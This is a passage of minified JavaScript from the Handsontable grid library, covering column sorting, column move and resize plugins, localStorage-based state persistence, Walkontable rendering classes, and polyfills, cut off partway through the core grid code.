var Handsontable={extension:{},plugins:{},helper:{}};(function($,window,Handsontable){"use strict";function CopyPasteClass(){this.refCounter=0;this.init()}function HandsontableColumnSorting(){function i(){var e=this;e.registerTimeout("enableObserveChanges",function(){e.updateSettings({observeChanges:true})},0)}function s(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}if(t[1]<n[1])return e?-1:1;if(t[1]>n[1])return e?1:-1;return 0}}function o(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}if(parseFloat(t[1])<parseFloat(n[1]))return e?-1:1;if(parseFloat(t[1])>parseFloat(n[1]))return e?1:-1;return 0}}function u(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}var r=new Date(t[1]);var i=new Date(n[1]);if(r<i)return e?-1:1;if(r>i)return e?1:-1;return 0}}function a(e){return function(t,n){if(t[1]===n[1]){return 0}if(t[1]===null){return 1}if(n[1]===null){return-1}var r=typeof t[1]==typeof []?t[1][0]:t[1];var i=typeof n[1]==typeof []?n[1][0]:n[1];if(a.prototype.source[r]<a.prototype.source[i])return e?-1:1;if(a.prototype.source[r]>a.prototype.source[i])return e?1:-1;return 0}}function f(e){return typeof e.sortColumn!="undefined"}var e=this;this.init=function(t){var s=this;var o=s.getSettings().columnSorting;var u,a;s.sortingEnabled=!!o;if(s.sortingEnabled){s.sortIndex=[];var f=n.call(s);if(typeof f!="undefined"){u=f.sortColumn;a=f.sortOrder}else{u=o.column;a=o.sortOrder}e.sortByColumn.call(s,u,a);s.sort=function(){var t=Array.prototype.slice.call(arguments);return e.sortByColumn.apply(s,t)};if(typeof s.getSettings().observeChanges=="undefined"){i.call(s)}if(t=="afterInit"){r.call(s);s.addHook("afterCreateRow",e.afterCreateRow);s.addHook("afterRemoveRow",e.afterRemoveRow);s.addHook("afterLoadData",e.init)}}else{delete s.sort;s.removeHook("afterCreateRow",e.afterCreateRow);s.removeHook("afterRemoveRow",e.afterRemoveRow);s.removeHook("afterLoadData",e.init)}};this.setSortingColumn=function(e,t){var n=this;if(typeof e=="undefined"){delete n.sortColumn;delete n.sortOrder;return}else if(n.sortColumn===e&&typeof t=="undefined"){n.sortOrder=!n.sortOrder}else{n.sortOrder=typeof t!="undefined"?t:true}n.sortColumn=e};this.sortByColumn=function(n,r){var i=this;e.setSortingColumn.call(i,n,r);if(typeof i.sortColumn=="undefined"){return}i.PluginHooks.run("beforeColumnSort",i.sortColumn,i.sortOrder);e.sort.call(i);i.render();t.call(i);i.PluginHooks.run("afterColumnSort",i.sortColumn,i.sortOrder)};var t=function(){var e=this;var t={};if(typeof e.sortColumn!="undefined"){t.sortColumn=e.sortColumn}if(typeof e.sortOrder!="undefined"){t.sortOrder=e.sortOrder}if(t.hasOwnProperty("sortColumn")||t.hasOwnProperty("sortOrder")){e.PluginHooks.run("persistentStateSave","columnSorting",t)}};var n=function(){var e=this;var t={};e.PluginHooks.run("persistentStateLoad","columnSorting",t);return t.value};var r=function(){function n(){var e=t.view.TBODY.querySelector("tr").querySelectorAll("th");return e.length}function r(e){var r=t.view.wt.wtDom.closest(e,"TH");return t.view.wt.wtDom.index(r)-n()}var t=this;t.rootElement.on("click.handsontable",".columnSorting",function(n){if(t.view.wt.wtDom.hasClass(n.target,"columnSorting")){var i=r(n.target);e.sortByColumn.call(t,i)}})};this.sort=function(){var e=this;if(typeof e.sortOrder=="undefined"){return}e.sortingEnabled=false;e.sortIndex.length=0;var t=this.colOffset();for(var n=0,r=this.countRows()-e.getSettings()["minSpareRows"];n<r;n++){this.sortIndex.push([n,e.getDataAtCell(n,this.sortColumn+t)])}var i=e.manualColumnPositions[e.sortColumn+e.colOffset()];var f=e.getCellMeta(0,i);var l;switch(f.type){case"date":l=u;break;case"numeric":l=o;break;default:if(e.getSettings().columns[i].selectOptions){l=a;var c=e.getSettings().columns[i];if(!c.dictionary){c.dictionary=[];for(var n=0;n<c.selectOptions.length;n++){if(c.selectOptions[n])c.dictionary[c.selectOptions[n].value]=c.selectOptions[n].name}}a.prototype.source=c.dictionary}else l=s}this.sortIndex.sort(l(e.sortOrder));for(var n=this.sortIndex.length;n<e.countRows();n++){this.sortIndex.push([n,e.getDataAtCell(n,this.sortColumn+t)])}e.sortingEnabled=true};this.translateRow=function(e){var t=this;if(t.sortingEnabled&&t.sortIndex&&t.sortIndex.length&&t.sortIndex[e]){return t.sortIndex[e][0]}return e};this.onBeforeGetSet=function(t){var n=this;t.row=e.translateRow.call(n,t.row)};this.untranslateRow=function(e){var t=this;if(t.sortingEnabled&&t.sortIndex&&t.sortIndex.length){for(var n=0;n<t.sortIndex.length;n++){if(t.sortIndex[n][0]==e){return n}}}};this.getColHeader=function(e,t){if(this.getSettings().columnSorting){this.view.wt.wtDom.addClass(t.querySelector(".colHeader"),"columnSorting")}};this.afterCreateRow=function(e,n){var r=this;if(!f(r)){return}for(var i=0;i<r.sortIndex.length;i++){if(r.sortIndex[i][0]>=e){r.sortIndex[i][0]+=n}}for(var i=0;i<n;i++){r.sortIndex.splice(e+i,0,[e+i,r.getData()[e+i][r.sortColumn+r.colOffset()]])}t.call(r)};this.afterRemoveRow=function(n,r){var i=this;if(!f(i)){return}var s=e.translateRow.call(i,n);i.sortIndex.splice(n,r);for(var o=0;o<i.sortIndex.length;o++){if(i.sortIndex[o][0]>s){i.sortIndex[o][0]-=r}}t.call(i)};this.afterChangeSort=function(t){var n=this;var r=false;var i={};if(!t){return}for(var s=0;s<t.length;s++){if(t[s][1]==n.sortColumn){r=true;i.row=e.translateRow.call(n,t[s][0]);i.col=t[s][1];break}}if(r){setTimeout(function(){e.sort.call(n);n.render();n.selectCell(e.untranslateRow.call(n,i.row),i.col)},0)}}}function HandsontableManualColumnMove(){var e,t,n,r,i;var s=document.createElement("DIV"),o=s.style;s.className="ghost";o.position="absolute";o.top="25px";o.left=0;o.width="10px";o.height="10px";o.backgroundColor="#CCC";o.opacity=.7;var u=function(){var e=this;e.PluginHooks.run("persistentStateSave","manualColumnPositions",e.manualColumnPositions)};var a=function(){var e=this;var t={};e.PluginHooks.run("persistentStateLoad","manualColumnPositions",t);return t.value};var f=function(){var a=this;a.rootElement.on("mousemove.manualColumnMove",function(t){if(e){o.left=i+t.pageX-r+6+"px";if(o.display==="none"){o.display="block"}}});a.rootElement.on("mouseup.manualColumnMove",function(){if(e){if(t<n){n--}if(a.getSettings().rowHeaders){t--;n--}if(a.getSettings().fixedColumnsLeft<n)n+=a.colOffset();a.manualColumnPositions.splice(n,0,a.manualColumnPositions.splice(t,1)[0]);$(".manualColumnMover.active").removeClass("active");e=false;a.forceFullRender=true;a.view.render();o.display="none";u.call(a);a.PluginHooks.run("afterColumnMove",t,n)}});a.rootElement.on("mousedown.manualColumnMove",".manualColumnMover",function(u){var f=u.currentTarget;var l=a.view.wt.wtDom.closest(f,"TH");t=a.view.wt.wtDom.index(l)+a.colOffset();n=t;e=true;r=u.pageX;var c=a.$table[0];c.parentNode.appendChild(s);o.width=a.view.wt.wtDom.outerWidth(l)+"px";o.height=a.view.wt.wtDom.outerHeight(c)+"px";i=parseInt(a.view.wt.wtDom.offset(l).left-a.view.wt.wtDom.offset(c).left,10);o.left=i+6+"px"});a.rootElement.on("mouseenter.manualColumnMove","td, th",function(){if(e){var t=a.view.THEAD.querySelector(".manualColumnMover.active");if(t){a.view.wt.wtDom.removeClass(t,"active")}n=a.view.wt.wtDom.index(this);var r=a.view.THEAD.querySelectorAll("th");var i=r[n].querySelector(".manualColumnMover");a.view.wt.wtDom.addClass(i,"active")}});a.addHook("afterDestroy",l)};var l=function(){var e=this;e.rootElement.off("mouseup.manualColumnMove");e.rootElement.off("mousemove.manualColumnMove");e.rootElement.off("mousedown.manualColumnMove");e.rootElement.off("mouseenter.manualColumnMove")};this.beforeInit=function(){this.manualColumnPositions=[]};this.init=function(e){var t=this;var n=!!this.getSettings().manualColumnMove;if(n){var r=this.getSettings().manualColumnMove;var i=a.call(t);if(typeof i!="undefined"){this.manualColumnPositions=i}else if(r instanceof Array){this.manualColumnPositions=r}else{this.manualColumnPositions=[]}t.forceFullRender=true;if(e=="afterInit"){f.call(this);if(this.manualColumnPositions.length>0){this.forceFullRender=true;this.render()}}}else{l.call(this);this.manualColumnPositions=[]}};this.modifyCol=function(e){if(this.getSettings().manualColumnMove){if(typeof this.manualColumnPositions[e]==="undefined"){this.manualColumnPositions[e]=e}return this.manualColumnPositions[e]}return e};this.getColHeader=function(e,t){if(this.getSettings().manualColumnMove){var n=document.createElement("DIV");n.className="manualColumnMover";t.firstChild.appendChild(n)}}}function HandsontableManualColumnResize(){function m(e){i=this;t=e;var r=this.view.wt.wtTable.getCoords(e)[1];if(r>=0){n=r;var s=this.view.wt.wtDom.offset(this.rootElement[0]).left;var o=this.view.wt.wtDom.offset(e).left;a=o-s-6;f.style.left=a+parseInt(this.view.wt.wtDom.outerWidth(e),10)+"px";this.rootElement[0].appendChild(f)}}function g(){var n=this;u=parseInt(this.view.wt.wtDom.outerWidth(t),10);n.view.wt.wtDom.addClass(f,"active");h.height=n.view.wt.wtDom.outerHeight(n.$table[0])+"px";e=n}var e,t,n,r,i,s,o,u,a,f=document.createElement("DIV"),l=document.createElement("DIV"),c=document.createElement("DIV"),h=c.style;f.className="manualColumnResizer";l.className="manualColumnResizerHandle";f.appendChild(l);c.className="manualColumnResizerLine";f.appendChild(c);var p=$(document);p.mousemove(function(t){if(e){r=u+(t.pageX-o);s=b(n,r);f.style.left=a+r+"px"}});p.mouseup(function(){if(e){i.view.wt.wtDom.removeClass(f,"active");e=false;if(s!=u){i.forceFullRender=true;i.view.render();d.call(i);i.PluginHooks.run("afterColumnResize",n,s)}m.call(i,t)}});var d=function(){var e=this;e.PluginHooks.run("persistentStateSave","manualColumnWidths",e.manualColumnWidths)};var v=function(){var e=this;var t={};e.PluginHooks.run("persistentStateLoad","manualColumnWidths",t);return t.value};var y=function(){var t=this;var r=0;var i=null;this.rootElement.on("mouseenter.handsontable","th",function(n){if(!e){m.call(t,n.currentTarget)}});this.rootElement.on("mousedown.handsontable",".manualColumnResizer",function(){if(i==null){i=setTimeout(function(){if(r>=2){s=t.determineColumnWidth.call(t,n);b(n,s);t.forceFullRender=true;t.view.render();t.PluginHooks.run("afterColumnResize",n,s)}r=0;i=null},500)}r++});this.rootElement.on("mousedown.handsontable",".manualColumnResizer",function(e){o=e.pageX;g.call(t);s=u})};this.beforeInit=function(){this.manualColumnWidths=[]};this.init=function(e){var t=this;var n=!!this.getSettings().manualColumnResize;if(n){var r=this.getSettings().manualColumnResize;var i=v.call(t);if(typeof i!="undefined"){this.manualColumnWidths=i}else if(r instanceof Array){this.manualColumnWidths=r}else{this.manualColumnWidths=[]}if(e=="afterInit"){y.call(this);t.forceFullRender=true;t.render()}}};var b=function(e,t){t=Math.max(t,20);e=i.PluginHooks.execute("modifyCol",e);i.manualColumnWidths[e]=t;return t};this.getColWidth=function(e,t){if(this.getSettings().manualColumnResize&&this.manualColumnWidths[e]){t.width=this.manualColumnWidths[e]}}}function Storage(e){var t;var n=function(){window.localStorage[e+"__"+"persistentStateKeys"]=JSON.stringify(t)};var r=function(){var n=window.localStorage[e+"__"+"persistentStateKeys"];var r=typeof n=="string"?JSON.parse(n):void 0;t=r?r:[]};var i=function(){t=[];n()};r();this.saveValue=function(r,i){window.localStorage[e+"_"+r]=JSON.stringify(i);if(t.indexOf(r)==-1){t.push(r);n()}};this.loadValue=function(t,n){t=typeof t!="undefined"?t:n;var r=window.localStorage[e+"_"+t];return typeof r=="undefined"?void 0:JSON.parse(r)};this.reset=function(t){window.localStorage.removeItem(e+"_"+t)};this.resetAll=function(){for(var n=0;n<t.length;n++){window.localStorage.removeItem(e+"_"+t[n])}i()}}function DragToScroll(){this.boundaries=null;this.callback=null}function WalkontableOverlay(){this.maxOuts=10}function WalkontableBorder(e,t){var n;this.instance=e;this.settings=t;this.wtDom=this.instance.wtDom;this.main=document.createElement("div");n=this.main.style;n.position="absolute";n.top=0;n.left=0;for(var r=0;r<5;r++){var i=document.createElement("DIV");i.className="wtBorder "+(t.className||"");n=i.style;n.backgroundColor=t.border.color;n.height=t.border.width+"px";n.width=t.border.width+"px";this.main.appendChild(i)}this.top=this.main.childNodes[0];this.left=this.main.childNodes[1];this.bottom=this.main.childNodes[2];this.right=this.main.childNodes[3];this.topStyle=this.top.style;this.leftStyle=this.left.style;this.bottomStyle=this.bottom.style;this.rightStyle=this.right.style;this.corner=this.main.childNodes[4];this.corner.className+=" corner";this.cornerStyle=this.corner.style;this.cornerStyle.width="5px";this.cornerStyle.height="5px";this.cornerStyle.border="2px solid #FFF";this.disappear();if(!e.wtTable.bordersHolder){e.wtTable.bordersHolder=document.createElement("div");e.wtTable.bordersHolder.className="htBorders";e.wtTable.hider.appendChild(e.wtTable.bordersHolder)}e.wtTable.bordersHolder.appendChild(this.main);var s=false;var o=$(document.body);o.on("mousedown.walkontable."+e.guid,function(){s=true});o.on("mouseup.walkontable."+e.guid,function(){s=false});$(this.main.childNodes).on("mouseenter",function(t){if(!s||!e.getSetting("hideBorderOnMouseDownOver")){return}t.preventDefault();t.stopImmediatePropagation();var n=this.getBoundingClientRect();var r=$(this);r.hide();var i=function(e){if(e.clientY<Math.floor(n.top)){return true}if(e.clientY>Math.ceil(n.top+n.height)){return true}if(e.clientX<Math.floor(n.left)){return true}if(e.clientX>Math.ceil(n.left+n.width)){return true}};o.on("mousemove.border."+e.guid,function(t){if(i(t)){o.off("mousemove.border."+e.guid);r.show()}})})}function WalkontableCellFilter(){this.offset=0;this.total=0;this.fixedCount=0}function WalkontableCellStrategy(e){this.instance=e}function WalkontableClassNameCache(){this.cache=[]}function WalkontableColumnFilter(){this.countTH=0}function WalkontableColumnStrategy(e,t,n,r){var i,s=0;WalkontableCellStrategy.apply(this,arguments);this.containerSizeFn=t;this.cellSizesSum=0;this.cellSizes=[];this.cellStretch=[];this.cellCount=0;this.remainingSize=0;this.strategy=r;while(true){i=n(s);if(i===void 0){break}if(this.cellSizesSum>=this.getContainerSize(this.cellSizesSum+i)){break}this.cellSizes.push(i);this.cellSizesSum+=i;this.cellCount++;s++}var o=this.getContainerSize(this.cellSizesSum);this.remainingSize=this.cellSizesSum-o}function Walkontable(e){var t=this,n=[];this.guid="wt_"+walkontableRandomString();this.wtDom=new WalkontableDom;if(e.cloneSource){this.cloneSource=e.cloneSource;this.cloneOverlay=e.cloneOverlay;this.wtSettings=e.cloneSource.wtSettings;this.wtTable=new WalkontableTable(this,e.table);this.wtScroll=new WalkontableScroll(this);this.wtViewport=e.cloneSource.wtViewport}else{this.wtSettings=new WalkontableSettings(this,e);this.wtTable=new WalkontableTable(this,e.table);this.wtScroll=new WalkontableScroll(this);this.wtViewport=new WalkontableViewport(this);this.wtScrollbars=new WalkontableScrollbars(this);this.wtWheel=new WalkontableWheel(this);this.wtEvent=new WalkontableEvent(this)}if(this.wtTable.THEAD.childNodes.length&&this.wtTable.THEAD.childNodes[0].childNodes.length){for(var r=0,i=this.wtTable.THEAD.childNodes[0].childNodes.length;r<i;r++){n.push(this.wtTable.THEAD.childNodes[0].childNodes[r].innerHTML)}if(!this.getSetting("columnHeaders").length){this.update("columnHeaders",[function(e,r){t.wtDom.fastInnerText(r,n[e])}])}}this.selections={};var s=this.getSetting("selections");if(s){for(var o in s){if(s.hasOwnProperty(o)){this.selections[o]=new WalkontableSelection(this,s[o])}}}this.drawn=false;this.drawInterrupted=false}function WalkontableDebugOverlay(e){this.instance=e;this.init();this.clone=this.makeClone("debug");this.clone.wtTable.holder.style.opacity=.4;this.clone.wtTable.holder.style.textShadow="0 0 2px #ff0000";var t=this;var n;var r=0;var i=0;var s=t.clone.wtTable.holder.parentNode;$(document.body).on("mousemove."+this.instance.guid,function(e){if(!t.instance.wtTable.holder.parentNode){return}if(e.clientX-r>-5&&e.clientX-r<5&&e.clientY-i>-5&&e.clientY-i<5){return}r=e.clientX;i=e.clientY;WalkontableDom.prototype.addClass(s,"wtDebugHidden");WalkontableDom.prototype.removeClass(s,"wtDebugVisible");clearTimeout(n);n=setTimeout(function(){WalkontableDom.prototype.removeClass(s,"wtDebugHidden");WalkontableDom.prototype.addClass(s,"wtDebugVisible")},1e3)})}function WalkontableDom(){}function WalkontableEvent(e){var t=this;this.instance=e;this.wtDom=this.instance.wtDom;var n=[null,null];var r=[null,null];var i=function(e){var i=t.parentCell(e.target);if(t.wtDom.hasClass(e.target,"corner")){t.instance.getSetting("onCellCornerMouseDown",e,e.target)}else if(i.TD&&i.TD.nodeName==="TD"){if(t.instance.hasSetting("onCellMouseDown")){t.instance.getSetting("onCellMouseDown",e,i.coords,i.TD)}}if(e.button!==2){if(i.TD&&i.TD.nodeName==="TD"){n[0]=i.TD;clearTimeout(r[0]);r[0]=setTimeout(function(){n[0]=null},1e3)}}};var s;var o=function(e){if(t.instance.hasSetting("onCellMouseOver")){var n=t.instance.wtTable.TABLE;var r=t.wtDom.closest(e.target,["TD","TH"],n);if(r&&r!==s&&t.wtDom.isChildOf(r,n)){s=r;if(r.nodeName==="TD"){t.instance.getSetting("onCellMouseOver",e,t.instance.wtTable.getCoords(r),r)}}}};var u=function(e){if(e.button!==2){var i=t.parentCell(e.target);if(i.TD===n[0]&&i.TD===n[1]){if(t.wtDom.hasClass(e.target,"corner")){t.instance.getSetting("onCellCornerDblClick",e,i.coords,i.TD)}else if(i.TD){t.instance.getSetting("onCellDblClick",e,i.coords,i.TD)}n[0]=null;n[1]=null}else if(i.TD===n[0]){n[1]=i.TD;clearTimeout(r[1]);r[1]=setTimeout(function(){n[1]=null},500)}}};$(this.instance.wtTable.holder).on("mousedown",i);$(this.instance.wtTable.TABLE).on("mouseover",o);$(this.instance.wtTable.holder).on("mouseup",u)}function walkontableRangesIntersect(){var e=arguments[0];var t=arguments[1];for(var n=1,r=arguments.length/2;n<r;n++){if(e<=arguments[2*n+1]&&t>=arguments[2*n]){return true}}return false}function walkontableRandomString(){function e(){return Math.floor((1+Math.random())*65536).toString(16).substring(1)}return e()+e()+e()+e()}function WalkontableRowFilter(){}function WalkontableRowStrategy(e,t,n){WalkontableCellStrategy.apply(this,arguments);this.containerSizeFn=t;this.sizeAtIndex=n;this.cellSizesSum=0;this.cellSizes=[];this.cellCount=0;this.remainingSize=-Infinity}function WalkontableScroll(e){this.instance=e}function WalkontableScrollbar(){}function WalkontableCornerScrollbarNative(e){this.instance=e;this.init();this.clone=this.makeClone("corner")}function WalkontableHorizontalScrollbarNative(e){this.instance=e;this.type="horizontal";this.cellSize=50;this.init();this.clone=this.makeClone("left")}function WalkontableVerticalScrollbarNative(e){this.instance=e;this.type="vertical";this.cellSize=23;this.init();this.clone=this.makeClone("top")}function WalkontableScrollbars(e){this.instance=e;if(e.getSetting("nativeScrollbars")){e.update("scrollbarWidth",e.wtDom.getScrollbarWidth());e.update("scrollbarHeight",e.wtDom.getScrollbarWidth());this.vertical=new WalkontableVerticalScrollbarNative(e);this.horizontal=new WalkontableHorizontalScrollbarNative(e);this.corner=new WalkontableCornerScrollbarNative(e);if(e.getSetting("debug")){this.debug=new WalkontableDebugOverlay(e)}this.registerListeners()}else{this.vertical=new WalkontableVerticalScrollbar(e);this.horizontal=new WalkontableHorizontalScrollbar(e)}}function WalkontableSelection(e,t){this.instance=e;this.settings=t;this.selected=[];if(t.border){this.border=new WalkontableBorder(e,t)}}function WalkontableSettings(e,t){var n=this;this.instance=e;this.defaults={table:void 0,debug:false,scrollH:"auto",scrollV:"auto",nativeScrollbars:false,stretchH:"hybrid",currentRowClassName:null,currentColumnClassName:null,data:void 0,offsetRow:0,offsetColumn:0,fixedColumnsLeft:0,fixedRowsTop:0,rowHeaders:function(){return[]},columnHeaders:function(){return[]},totalRows:void 0,totalColumns:void 0,width:null,height:null,cellRenderer:function(e,t,r){var i=n.getSetting("data",e,t);n.instance.wtDom.fastInnerText(r,i===void 0||i===null?"":i)},columnWidth:50,selections:null,hideBorderOnMouseDownOver:false,onCellMouseDown:null,onCellMouseOver:null,onCellDblClick:null,onCellCornerMouseDown:null,onCellCornerDblClick:null,beforeDraw:null,onDraw:null,onScrollVertically:null,onScrollHorizontally:null,scrollbarWidth:10,scrollbarHeight:10};this.settings={};for(var r in this.defaults){if(this.defaults.hasOwnProperty(r)){if(t[r]!==void 0){this.settings[r]=t[r]}else if(this.defaults[r]===void 0){throw new Error('A required setting "'+r+'" was not provided')}else{this.settings[r]=this.defaults[r]}}}}function WalkontableTable(e,t){this.instance=e;this.TABLE=t;this.wtDom=this.instance.wtDom;this.wtDom.removeTextNodes(this.TABLE);var n=this.TABLE.parentNode;if(!n||n.nodeType!==1||!this.wtDom.hasClass(n,"wtHolder")){var r=document.createElement("DIV");r.className="wtSpreader";if(n){n.insertBefore(r,this.TABLE)}r.appendChild(this.TABLE)}this.spreader=this.TABLE.parentNode;n=this.spreader.parentNode;if(!n||n.nodeType!==1||!this.wtDom.hasClass(n,"wtHolder")){var i=document.createElement("DIV");i.className="wtHider";if(n){n.insertBefore(i,this.spreader)}i.appendChild(this.spreader)}this.hider=this.spreader.parentNode;this.hiderStyle=this.hider.style;this.hiderStyle.position="relative";n=this.hider.parentNode;if(!n||n.nodeType!==1||!this.wtDom.hasClass(n,"wtHolder")){var s=document.createElement("DIV");s.style.position="relative";s.className="wtHolder";if(n){n.insertBefore(s,this.hider)}s.appendChild(this.hider)}this.holder=this.hider.parentNode;this.TBODY=this.TABLE.getElementsByTagName("TBODY")[0];if(!this.TBODY){this.TBODY=document.createElement("TBODY");this.TABLE.appendChild(this.TBODY)}this.THEAD=this.TABLE.getElementsByTagName("THEAD")[0];if(!this.THEAD){this.THEAD=document.createElement("THEAD");this.TABLE.insertBefore(this.THEAD,this.TBODY)}this.COLGROUP=this.TABLE.getElementsByTagName("COLGROUP")[0];if(!this.COLGROUP){this.COLGROUP=document.createElement("COLGROUP");this.TABLE.insertBefore(this.COLGROUP,this.THEAD)}if(this.instance.getSetting("columnHeaders").length){if(!this.THEAD.childNodes.length){var o=document.createElement("TR");this.THEAD.appendChild(o)}}this.colgroupChildrenLength=this.COLGROUP.childNodes.length;this.theadChildrenLength=this.THEAD.firstChild?this.THEAD.firstChild.childNodes.length:0;this.tbodyChildrenLength=this.TBODY.childNodes.length;this.oldCellCache=new WalkontableClassNameCache;this.currentCellCache=new WalkontableClassNameCache;this.rowFilter=new WalkontableRowFilter;this.columnFilter=new WalkontableColumnFilter;this.verticalRenderReverse=false}function WalkontableViewport(e){this.instance=e;this.resetSettings();if(this.instance.getSetting("nativeScrollbars")){var t=this;$(window).on("resize",function(){t.clientHeight=t.getWorkspaceHeight()})}}function WalkontableWheel(e){if(e.getSetting("nativeScrollbars")){return}$(e.wtTable.spreader).on("mousewheel",function(t,n,r,i){if(!r&&!i&&n){i=n}if(!r&&!i){return}if(i>0&&e.getSetting("offsetRow")===0){return}else if(i<0&&e.wtTable.isLastRowFullyVisible()){return}else if(r<0&&e.getSetting("offsetColumn")===0){return}else if(r>0&&e.wtTable.isLastColumnFullyVisible()){return}clearTimeout(e.wheelTimeout);e.wheelTimeout=setTimeout(function(){if(i){if(e.wtScrollbars.vertical.visible){e.scrollVertical(-Math.ceil(i)).draw()}}else if(r){if(e.wtScrollbars.horizontal.visible){e.scrollHorizontal(Math.ceil(r)).draw()}}},0);t.preventDefault()})}if(!Array.prototype.indexOf){Array.prototype.indexOf=function(e){var t=this.length>>>0;var n=Number(arguments[1])||0;n=n<0?Math.ceil(n):Math.floor(n);if(n<0)n+=t;for(;n<t;n++){if(n in this&&this[n]===e)return n}return-1}}if(!Array.prototype.filter){Array.prototype.filter=function(e,t){"use strict";function o(e){return/NodeList/i.test(e.item)}function u(e){var t=[];for(var n=0,r=e.length;n<r;n++){t[n]=e[n]}return t}if(typeof this==="undefined"||this===null){throw new TypeError}if(typeof e!=="function"){throw new TypeError}t=t||this;if(o(t)){t=u(t)}var n=t.length,r=[],i,s;for(i=0;i<n;i+=1){if(t.hasOwnProperty(i)){s=t[i];if(e.call(t,s,i,t)){r.push(s)}}}return r}}if(typeof WeakMap==="undefined"){(function(){var e=Object.defineProperty;try{var t=true;e(function(){},"foo",{})}catch(n){t=false}var r=+(new Date)%1e9;var i=function(){this.name="__st"+(Math.random()*1e9>>>0)+(r++ +"__");if(!t){this._wmCache=[]}};if(t){i.prototype={set:function(t,n){var r=t[this.name];if(r&&r[0]===t)r[1]=n;else e(t,this.name,{value:[t,n],writable:true})},get:function(e){var t;return(t=e[this.name])&&t[0]===e?t[1]:undefined},"delete":function(e){this.set(e,undefined)}}}else{i.prototype={set:function(e,t){if(typeof e=="undefined"||typeof t=="undefined")return;for(var n=0,r=this._wmCache.length;n<r;n++){if(this._wmCache[n].key==e){this._wmCache[n].value=t;return}}this._wmCache.push({key:e,value:t})},get:function(e){if(typeof e=="undefined")return;for(var t=0,n=this._wmCache.length;t<n;t++){if(this._wmCache[t].key==e){return this._wmCache[t].value}}return},"delete":function(e){if(typeof e=="undefined")return;for(var t=0,n=this._wmCache.length;t<n;t++){if(this._wmCache[t].key==e){Array.prototype.slice.call(this._wmCache,t,1)}}}}}window.WeakMap=i})()}Handsontable.activeGuid=null;Handsontable.Core=function(rootElement,userSettings){function ValidatorsQueue(){var e=false;return{validatorsInQueue:0,addValidatorToQueue:function(){this.validatorsInQueue++;e=false},removeValidatorFormQueue:function(){this.validatorsInQueue=this.validatorsInQueue-1<0?0:this.validatorsInQueue-1;this.checkIfQueueIsEmpty()},onQueueEmpty:function(){},checkIfQueueIsEmpty:function(){if(this.validatorsInQueue==0&&e==false){e=true;this.onQueueEmpty()}}}}function validateChanges(e,t,n){function f(){var r;if(e.length){r=instance.PluginHooks.execute("beforeChange",e,t);if(typeof r==="function"){$.when(result).then(function(){n()})}else if(r===false){e.splice(0,e.length)}}if(typeof r!=="function"){n()}}var r=new ValidatorsQueue;r.onQueueEmpty=f;for(var i=e.length-1;i>=0;i--){if(e[i]===null){e.splice(i,1)}else{var s=e[i][0];var o=datamap.propToCol(e[i][1]);var u=instance.runHooksAndReturn("modifyCol",o);var a=instance.getCellMeta(s,u);if(a.type==="numeric"&&typeof e[i][3]==="string"){if(e[i][3].length>0&&/^-?[\d\s]*\.?\d*$/.test(e[i][3])){e[i][3]=numeral().unformat(e[i][3]||"0")}}if(instance.getCellValidator(a)){r.addValidatorToQueue();instance.validateCell(e[i][3],a,function(t,n){return function(i){if(typeof i!=="boolean"){throw new Error("Validation error: result is not boolean")}if(i===false&&n.allowInvalid===false){e.splice(t,1);n.valid=true;--t}r.removeValidatorFormQueue()}}(i,a),t)}}}r.checkIfQueueIsEmpty()}function applyChanges(e,t){var n=e.length-1;if(n<0){return}for(;0<=n;n--){if(e[n]===null){e.splice(n,1);continue}if(priv.settings.minSpareRows){while(e[n][0]>instance.countRows()-1){datamap.createRow()}}if(instance.dataType==="array"&&priv.settings.minSpareCols){while(datamap.propToCol(e[n][1])>instance.countCols()-1){datamap.createCol()}}datamap.set(e[n][0],e[n][1],e[n][3])}instance.forceFullRender=true;grid.adjustRowsAndCols();selection.refreshBorders(null,true);instance.PluginHooks.run("afterChange",e,t||"edit")}function setDataInputToArray(e,t,n){if(typeof e==="object"){return e}else if($.isPlainObject(n)){return n}else{return[[e,t,n]]}}function expandType(e){if(!e.hasOwnProperty("type"))return;var t,n={};if(typeof e.type==="object"){t=e.type}else if(typeof e.type==="string"){t=Handsontable.cellTypes[e.type];if(t===void 0){throw new Error('You declared cell type "'+e.type+'" as a string that is not mapped to a known object. Cell type must be an object or a string mapped to an object in Handsontable.cellTypes')}}for(var r in t){if(t.hasOwnProperty(r)&&!e.hasOwnProperty(r)){n[r]=t[r]}}return n}var priv,datamap,grid,selection,editorManager,autofill,instance=this,GridSettings=function(){};Handsontable.helper.extend(GridSettings.prototype,DefaultSettings.prototype);Handsontable.helper.extend(GridSettings.prototype,userSettings);Handsontable.helper.extend(GridSettings.prototype,expandType(userSettings));this.rootElement=rootElement;var $document=$(document.documentElement);var $body=$(document.body);this.guid="ht_"+Handsontable.helper.randomString();if(!this.rootElement[0].id){this.rootElement[0].id=this.guid}priv={cellSettings:[],columnSettings:[],columnsSettingConflicts:["data","width"],settings:new GridSettings,settingsFromDOM:{},selStart:new Handsontable.SelectionPoint,selEnd:new Handsontable.SelectionPoint,isPopulated:null,scrollable:null,extensions:{},firstRun:true};grid={alter:function(e,t,n,r,i){var s;n=n||1;switch(e){case"insert_row":s=datamap.createRow(t,n);if(s){if(priv.selStart.exists()&&priv.selStart.row()>=t){priv.selStart.row(priv.selStart.row()+s);selection.transformEnd(s,0)}else{selection.refreshBorders()}}break;case"insert_col":s=datamap.createCol(t,n);if(s){if(Handsontable.helper.isArray(instance.getSettings().colHeaders)){var o=[t,0];o.length+=s;Array.prototype.splice.apply(instance.getSettings().colHeaders,o)}if(priv.selStart.exists()&&priv.selStart.col()>=t){priv.selStart.col(priv.selStart.col()+s);selection.transformEnd(0,s)}else{selection.refreshBorders()}}break;case"remove_row":datamap.removeRow(t,n);priv.cellSettings.splice(t,n);grid.adjustRowsAndCols();selection.refreshBorders();break;case"remove_col":datamap.removeCol(t,n);for(var u=0,a=datamap.getAll().length;u<a;u++){if(u in priv.cellSettings){priv.cellSettings[u].splice(t,n)}}if(Handsontable.helper.isArray(instance.getSettings().colHeaders)){if(typeof t=="undefined"){t=-1}instance.getSettings().colHeaders.splice(t,n)}priv.columnSettings.splice(t,n);grid.adjustRowsAndCols();selection.refreshBorders();break;default:throw new Error('There is no such action "'+e+'"');break}if(!i){grid.adjustRowsAndCols()}},adjustRowsAndCols:function(){var 